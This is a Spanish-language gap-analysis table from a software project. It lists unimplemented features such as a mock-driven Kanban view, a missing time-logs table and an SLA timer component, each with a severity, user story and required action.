| # | Brecha | Severidad | US | Escenario | Acción Requerida |
|---|--------|:---------:|:--:|-----------|-----------------|
| B-06 | KanbanView.vue hardcodeado con mocks | 🟠 P1 | US-008 | CU-J06-08–11, 16 | Implementar state machine real + `PATCH` endpoint + WebSocket |
| B-07 | Sin tabla `ibpms_time_logs` | 🟠 P1 | US-008 | CU-J06-16 | Crear tabla polimórfica + componente `<UniversalSlaTimer>` |
| B-08 | Badge "Inactivo X días" no implementado | 🟡 P2 | US-030 | CU-J06-NEG-03 | Implementar cálculo de inactividad + UI badge |
| B-09 | US-043 CA-6 deuda técnica sin resolver | 🟡 P2 | US-043 | CU-J06-15 | Implementar alertas tempranas SLA (80%) vía Motor de Notificaciones |
| B-10 | `<UniversalSlaTimer>` no implementado como componente agnóstico | 🟡 P2 | US-008 | CU-J06-16 | Crear componente reutilizable para P1, P3, P10.B |
